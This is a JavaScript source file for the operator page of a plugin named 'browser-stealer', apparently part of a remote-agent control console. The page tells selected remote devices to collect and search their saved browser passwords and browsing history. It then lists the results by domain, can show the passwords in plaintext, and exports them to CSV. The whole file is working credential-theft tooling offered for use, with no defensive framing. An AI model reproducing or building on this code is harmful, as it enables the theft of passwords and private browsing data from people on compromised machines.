'use strict';

/* global LibraPluginHost */

/**
 * 浏览器数据插件页面（page/index.js）—— com.libra.browser-stealer。
 * 纯原生 JavaScript + DOM，零外部依赖。与宿主通过 window.LibraPluginHost 通信。
 *
 * 数据流：
 *   1. collect：dispatchTask(PLUGIN_ID, 'collect', { type, offset, limit })
 *      → { total, offset, limit, items: [BrowserPassword|BrowserHistory] }
 *   2. search：dispatchTask(PLUGIN_ID, 'search', { type, keyword })
 *      → { total, items: [...] }
 * result 可能是对象或 JSON 字符串（服务端透传），统一经 parseResult 解析。
 */
const PLUGIN_ID = 'com.libra.browser-stealer';
const PAGE_SIZE = 250;

const host = LibraPluginHost.usePluginHost();
const app = document.getElementById('app');

/* ------------------------------------------------------------------ */
/* 状态                                                               */
/* ------------------------------------------------------------------ */

function createStore(type) {
  return {
    type,
    items: [],
    total: 0,
    loading: false,
    initialLoading: true,
    errors: [],
    offset: 0,
    hasMore: true,
  };
}

const stores = {
  passwords: createStore('passwords'),
  history: createStore('history'),
};

const state = {
  subTab: 'passwords',
  showAllPasswords: false,
  searchKeyword: '',
  searchLoading: false,
  searchResults: null, // null = 非搜索模式；数组 = 搜索模式
  searchTotal: 0,
  searchError: null,
  exportOpen: false,
};

const observerMap = {}; // type -> IntersectionObserver
let lastAgentId = undefined;

/* ------------------------------------------------------------------ */
/* 工具                                                               */
/* ------------------------------------------------------------------ */

/** 插件结果可能是 JSON 字符串（服务端透传）或已是对象，统一解析。 */
function parseResult(raw) {
  if (raw && typeof raw === 'object' && !Array.isArray(raw)) return raw;
  if (typeof raw === 'string') {
    try {
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) return parsed;
    } catch {
      /* 非 JSON */
    }
  }
  return null;
}

function esc(value) {
  const s = value == null ? '' : String(value);
  return s.replace(/[&<>"']/g, (c) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  }[c]));
}

function isSearching() {
  return state.searchResults !== null;
}

function currentStore() {
  return stores[state.subTab];
}

function currentTotal() {
  if (isSearching()) return state.searchTotal;
  return state.subTab === 'passwords' ? stores.passwords.total : stores.history.total;
}

function filteredPasswords() {
  const source = isSearching() && state.subTab === 'passwords'
    ? state.searchResults
    : stores.passwords.items;
  return (source || []).filter((p) => p.url || p.username || p.password);
}

function filteredHistory() {
  if (isSearching() && state.subTab === 'history') return state.searchResults || [];
  return stores.history.items;
}

function passwordsDomainOf(p) {
  try {
    return new URL(p.url).hostname;
  } catch {
    return p.url || '(other)';
  }
}

function historyHostOf(h) {
  try {
    return new URL(h.url).hostname;
  } catch {
    return '(other)';
  }
}

function groupByDomain(items, domainOf) {
  const map = new Map();
  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    const key = domainOf(item);
    if (!map.has(key)) map.set(key, []);
    map.get(key).push(Object.assign({}, item, { key: String(i) }));
  }
  return Array.from(map.entries()).sort((a, b) => b[1].length - a[1].length);
}

/* ------------------------------------------------------------------ */
/* 数据获取                                                           */
/* ------------------------------------------------------------------ */

async function fetchPage(store, reset = false) {
  const agent = host.selectedAgent;
  if (!agent) return;
  if (store.loading) return;
  const offset = reset ? 0 : store.offset;
  if (!reset && !store.hasMore) return;

  store.loading = true;
  render();

  try {
    const res = await host.dispatchTask(PLUGIN_ID, 'collect', {
      type: store.type,
      offset,
      limit: PAGE_SIZE,
    });
    const parsed = parseResult(res.result) || { total: 0, offset, limit: PAGE_SIZE, items: [] };
    store.total = typeof parsed.total === 'number' ? parsed.total : 0;
    if (Array.isArray(parsed.errors)) store.errors.push(...parsed.errors);
    const newItems = Array.isArray(parsed.items) ? parsed.items : [];
    if (reset) {
      store.items = newItems.slice();
      store.offset = newItems.length;
    } else {
      store.items = store.items.concat(newItems);
      store.offset = offset + newItems.length;
    }
    store.hasMore = store.offset < store.total;
  } catch {
    store.errors.push('Failed to fetch ' + store.type);
  } finally {
    store.loading = false;
    store.initialLoading = false;
    render();
  }
}

function resetStore(store) {
  store.items = [];
  store.total = 0;
  store.errors = [];
  store.offset = 0;
  store.hasMore = true;
  store.initialLoading = true;
}

function clearSearch() {
  state.searchResults = null;
  state.searchKeyword = '';
  state.searchError = null;
}

/* ------------------------------------------------------------------ */
/* 交互                                                               */
/* ------------------------------------------------------------------ */

function handleTabChange(key) {
  state.subTab = key;
  clearSearch();
  state.exportOpen = false;
  const store = stores[key];
  if (store.initialLoading && store.items.length === 0) fetchPage(store, true);
  render();
}

function handleRefresh() {
  clearSearch();
  state.exportOpen = false;
  const store = currentStore();
  resetStore(store);
  render();
  setTimeout(() => fetchPage(store, true), 0);
}

async function handleSearch() {
  const keyword = state.searchKeyword.trim();
  if (!keyword || !host.selectedAgent) return;
  state.searchLoading = true;
  state.searchError = null;
  state.searchResults = null;
  state.exportOpen = false;
  render();

  try {
    const res = await host.dispatchTask(PLUGIN_ID, 'search', {
      type: state.subTab,
      keyword,
    });
    const parsed = parseResult(res.result) || { total: 0, items: [] };
    state.searchResults = Array.isArray(parsed.items) ? parsed.items : [];
    state.searchTotal = typeof parsed.total === 'number' ? parsed.total : 0;
  } catch (err) {
    state.searchError = err instanceof Error ? err.message : String(err);
  } finally {
    state.searchLoading = false;
    render();
  }
}

function handleExport(exportAll) {
  state.exportOpen = false;
  if (state.subTab === 'passwords') {
    const data = exportAll ? stores.passwords.items : filteredPasswords();
    downloadCsv(
      `browser_passwords${state.searchKeyword ? '_search' : ''}.csv`,
      ['Browser', 'URL', 'Username', 'Password', 'Version'],
      data.map((p) => [p.browser, p.url, p.username, p.password, p.version ?? '']),
    );
  } else {
    const data = exportAll ? stores.history.items : filteredHistory();
    downloadCsv(
      `browser_history${state.searchKeyword ? '_search' : ''}.csv`,
      ['Browser', 'URL', 'Title', 'Visits'],
      data.map((h) => [h.browser, h.url, h.title, h.visits]),
    );
  }
  render();
}

/* ------------------------------------------------------------------ */
/* CSV 导出                                                           */
/* ------------------------------------------------------------------ */

function downloadCsv(filename, headers, rows) {
  const csvContent = [
    headers.join(','),
    ...rows.map((row) => row.map((cell) => {
      const s = cell == null ? '' : String(cell);
      return s.includes(',') || s.includes('"') || s.includes('\n')
        ? `"${s.replace(/"/g, '""')}"`
        : s;
    }).join(',')),
  ].join('\n');

  const BOM = '\uFEFF';
  const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

/* ------------------------------------------------------------------ */
/* 图标（内联 SVG，零依赖）                                           */
/* ------------------------------------------------------------------ */

const ICON = {
  eye: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>',
  eyeSlash: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/><path d="M3 3l18 18"/></svg>',
  refresh: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12a9 9 0 1 1-2.6-6.4"/><path d="M21 3v6h-6"/></svg>',
  download: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>',
  globe: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M3 12h18"/><path d="M12 3a13.5 13.5 0 0 1 0 18 13.5 13.5 0 0 1 0-18Z"/></svg>',
  chevron: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg>',
  search: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>',
};

function spinner() {
  return '<span class="spinner" aria-hidden="true"></span>';
}

/* ------------------------------------------------------------------ */
/* 渲染                                                               */
/* ------------------------------------------------------------------ */

function render() {
  if (!host.selectedAgent) {
    teardownScrollLoader();
    app.innerHTML = [
      '<div class="empty-state">',
      '  <div class="empty-state-icon">' + ICON.globe + '</div>',
      '  <p>请先在控制台顶部选择设备</p>',
      '</div>',
    ].join('');
    return;
  }

  // TSX 版在密码页签首次加载时整体显示骨架屏
  if (state.subTab === 'passwords' && stores.passwords.initialLoading) {
    teardownScrollLoader();
    app.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
    return;
  }

  app.innerHTML = fullPage();
  setupScrollLoader();
}

function fullPage() {
  const pw = stores.passwords;
  const hs = stores.history;
  const errors = currentStore().errors;
  const searching = isSearching();
  const searchDisabled = state.searchLoading || !state.searchKeyword.trim();

  return [
    '<div class="toolbar">',
    '  <div class="chips">',
    '    <span class="chip accent">密码: ' + pw.total + '</span>',
    '    <span class="chip">历史记录: ' + hs.total + '</span>',
    '  </div>',
    '  <div class="toolbar-actions">',
    '    <button class="btn icon" type="button" data-action="toggle-passwords" title="显示/隐藏密码" aria-label="显示/隐藏密码">',
    state.showAllPasswords ? ICON.eyeSlash : ICON.eye,
    '    </button>',
    '    <button class="btn icon" type="button" data-action="refresh" title="刷新" aria-label="刷新">' + ICON.refresh + '</button>',
    '    <div class="export-wrap">',
    '      <button class="btn icon" type="button" data-action="toggle-export" title="导出" aria-label="导出" aria-expanded="' + state.exportOpen + '">' + ICON.download + '</button>',
    state.exportOpen ? exportMenu() : '',
    '    </div>',
    '  </div>',
    '</div>',
    '<div class="search-row">',
    '  <input id="search-input" class="search-input" type="search" placeholder="搜索 url、用户名、密码..." value="' + esc(state.searchKeyword) + '" autocomplete="off" spellcheck="false">',
    '  <button class="btn primary" type="button" data-action="search" title="搜索" aria-label="搜索"' + (searchDisabled ? ' disabled' : '') + '>',
    state.searchLoading ? spinner() : ICON.search,
    '  </button>',
    searching ? '<button class="btn" type="button" data-action="clear-search">清除</button>' : '',
    '</div>',
    state.searchError ? '<div class="message error">' + esc(state.searchError) + '</div>' : '',
    searching && !state.searchLoading
      ? '<div class="message hint">搜索 "' + esc(state.searchKeyword) + '" 找到 ' + state.searchTotal + ' 条结果</div>'
      : '',
    errors.length > 0 ? '<div class="message error">' + esc(errors.join('; ')) + '</div>' : '',
    '<div class="tabs" role="tablist" aria-label="浏览器数据">',
    '  <button class="tab' + (state.subTab === 'passwords' ? ' active' : '') + '" type="button" role="tab" aria-selected="' + (state.subTab === 'passwords') + '" data-action="tab" data-tab="passwords">密码</button>',
    '  <button class="tab' + (state.subTab === 'history' ? ' active' : '') + '" type="button" role="tab" aria-selected="' + (state.subTab === 'history') + '" data-action="tab" data-tab="history">历史记录</button>',
    '</div>',
    '<div class="panel" role="tabpanel">',
    state.subTab === 'passwords' ? passwordsPanel() : historyPanel(),
    '</div>',
  ].join('');
}

function exportMenu() {
  const searching = isSearching();
  return [
    '<div class="export-menu">',
    '  <button type="button" data-action="export-all">导出全部 (' + currentTotal() + ')</button>',
    searching ? '  <button type="button" data-action="export-search">导出搜索结果 (' + state.searchTotal + ')</button>' : '',
    '</div>',
  ].join('');
}

function scrollLoaderHTML(type) {
  const store = stores[type];
  return '<div class="scroll-sentinel" data-sentinel="' + type + '">'
    + (store.loading ? '<div class="skeleton small"></div>' : '')
    + '</div>';
}

function passwordsPanel() {
  const items = filteredPasswords();
  const pw = stores.passwords;
  if (items.length === 0 && !pw.loading) return '<div class="empty">暂无数据。</div>';

  const groups = groupByDomain(items, passwordsDomainOf);
  const list = groups.map(([domain, groupItems]) => {
    const rows = groupItems.map((p) => [
      '<tr>',
      '  <td><span class="chip">' + esc(p.browser) + '</span></td>',
      '<td><span class="cell-clip url" title="' + esc(p.url) + '">' + esc(p.url) + '</span></td>',
      '  <td>' + esc(p.username) + '</td>',
      '  <td class="cell-password">' + (state.showAllPasswords ? esc(p.password) : '<span class="masked">••••••••</span>') + '</td>',
      '</tr>',
    ].join(''));
    return [
      '<details class="group">',
      '  <summary>',
      '    <span class="group-icon">' + ICON.globe + '</span>',
      '    <span class="group-name">' + esc(domain) + '</span>',
      '    <span class="chip">' + groupItems.length + '</span>',
      '    <span class="chevron">' + ICON.chevron + '</span>',
      '  </summary>',
      '  <div class="table-wrap">',
      '    <table>',
      '      <thead><tr><th>来源</th><th>URL</th><th>用户名</th><th>密码</th></tr></thead>',
      '      <tbody>' + rows + '</tbody>',
      '    </table>',
      '  </div>',
      '</details>',
    ].join('');
  }).join('');

  return '<div class="list">' + list + (isSearching() ? '' : scrollLoaderHTML('passwords')) + '</div>';
}

function historyPanel() {
  const items = filteredHistory();
  const hs = stores.history;
  if (items.length === 0 && !hs.loading) return '<div class="empty">暂无数据。</div>';

  const groups = groupByDomain(items, historyHostOf);
  const list = groups.map(([host, groupItems]) => {
    const rows = groupItems.map((h) => [
      '<tr>',
      '  <td><span class="cell-clip title" title="' + esc(h.title) + '">' + esc(h.title || '-') + '</span></td>',
      '  <td><span class="cell-clip url" title="' + esc(h.url) + '">' + esc(h.url) + '</span></td>',
      '  <td>' + esc(h.visits) + '</td>',
      '  <td><span class="chip">' + esc(h.browser) + '</span></td>',
      '</tr>',
    ].join(''));
    return [
      '<details class="group">',
      '  <summary>',
      '    <span class="group-icon">' + ICON.globe + '</span>',
      '    <span class="group-name">' + esc(host) + '</span>',
      '    <span class="chip">' + groupItems.length + '</span>',
      '    <span class="chevron">' + ICON.chevron + '</span>',
      '  </summary>',
      '  <div class="table-wrap">',
      '    <table>',
      '      <thead><tr><th>标题</th><th>URL</th><th>访问次数</th><th>来源</th></tr></thead>',
      '      <tbody>' + rows + '</tbody>',
      '    </table>',
      '  </div>',
      '</details>',
    ].join('');
  }).join('');

  return '<div class="list">' + list + (isSearching() ? '' : scrollLoaderHTML('history')) + '</div>';
}

/* ------------------------------------------------------------------ */
/* 滚动分页（IntersectionObserver）                                   */
/* ------------------------------------------------------------------ */

function teardownScrollLoader() {
  for (const key of Object.keys(observerMap)) {
    observerMap[key].disconnect();
  }
  for (const key of Object.keys(observerMap)) delete observerMap[key];
}

function setupScrollLoader() {
  teardownScrollLoader();
  if (isSearching()) return;
  const type = state.subTab;
  const store = stores[type];
  const el = app.querySelector('[data-sentinel="' + type + '"]');
  if (!el || store.loading || !store.hasMore) return;

  const obs = new IntersectionObserver((entries) => {
    if (entries[0] && entries[0].isIntersecting) fetchPage(store, false);
  }, { rootMargin: '200px' });
  observerMap[type] = obs;
  obs.observe(el);
}

/* ------------------------------------------------------------------ */
/* 事件                                                               */
/* ------------------------------------------------------------------ */

function handleClick(e) {
  const target = e.target.closest('[data-action]');
  if (!target) return;
  switch (target.dataset.action) {
    case 'toggle-passwords':
      state.showAllPasswords = !state.showAllPasswords;
      render();
      break;
    case 'refresh':
      handleRefresh();
      break;
    case 'toggle-export':
      state.exportOpen = !state.exportOpen;
      render();
      break;
    case 'export-all':
      handleExport(true);
      break;
    case 'export-search':
      handleExport(false);
      break;
    case 'tab':
      handleTabChange(target.dataset.tab);
      break;
    case 'search':
      handleSearch();
      break;
    case 'clear-search':
      clearSearch();
      state.exportOpen = false;
      render();
      break;
    default:
      break;
  }
}

function handleInput(e) {
  if (e.target.id !== 'search-input') return;
  state.searchKeyword = e.target.value;
  const btn = app.querySelector('[data-action="search"]');
  if (btn) btn.disabled = state.searchLoading || !state.searchKeyword.trim();
}

function handleKeydown(e) {
  if (e.key === 'Enter' && e.target.id === 'search-input') handleSearch();
}

app.addEventListener('click', handleClick);
app.addEventListener('input', handleInput);
app.addEventListener('keydown', handleKeydown);

document.addEventListener('click', (e) => {
  if (!state.exportOpen) return;
  if (e.target.closest('.export-wrap')) return;
  state.exportOpen = false;
  render();
});

/* ------------------------------------------------------------------ */
/* 初始化与选中设备同步                                               */
/* ------------------------------------------------------------------ */

function checkAgent() {
  const agent = host.selectedAgent;
  const id = agent && agent.id ? agent.id : null;
  if (id === lastAgentId) return;
  lastAgentId = id;
  render();
  if (id) fetchPage(stores.passwords, true);
}

// 桥 SDK 的 getState 为异步，首次渲染前快速轮询等待选中设备；
// 之后每 2s 与宿主同步（控制台切换设备时联动重新采集密码页签）。
function waitForAgent() {
  if (host.selectedAgent) {
    checkAgent();
    return;
  }
  setTimeout(waitForAgent, 200);
}

setTimeout(waitForAgent, 0);
setInterval(checkAgent, 2000);
